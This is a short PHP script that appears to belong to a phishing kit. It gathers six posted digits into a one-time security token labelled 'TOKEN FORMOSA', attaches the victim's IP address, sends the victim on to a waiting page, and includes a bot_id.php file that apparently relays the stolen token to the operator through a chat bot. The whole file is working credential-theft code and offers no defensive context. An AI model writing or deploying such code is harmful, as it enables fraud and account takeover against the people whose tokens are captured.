<?php  
  $digit1 = $_POST['digit1'];
  $digit2 = $_POST['digit2'];
  $digit3 = $_POST['digit3'];
  $digit4 = $_POST['digit4'];
  $digit5 = $_POST['digit5'];
  $digit6 = $_POST['digit6'];
  
  $tok = $digit1 . $digit2 . $digit3 . $digit4 . $digit5 . $digit6;
  
  $enviara = "TOKEN FORMOSA ##\n" .
             "<b>TOKEN: </b>  <code>".$tok."</code>\n" .
             "🌐 IP ".$_SERVER['REMOTE_ADDR']."\n";
             header ("location:espere2.php");
  $enviar = urldecode($enviara);
  include 'bot_id.php';


?>
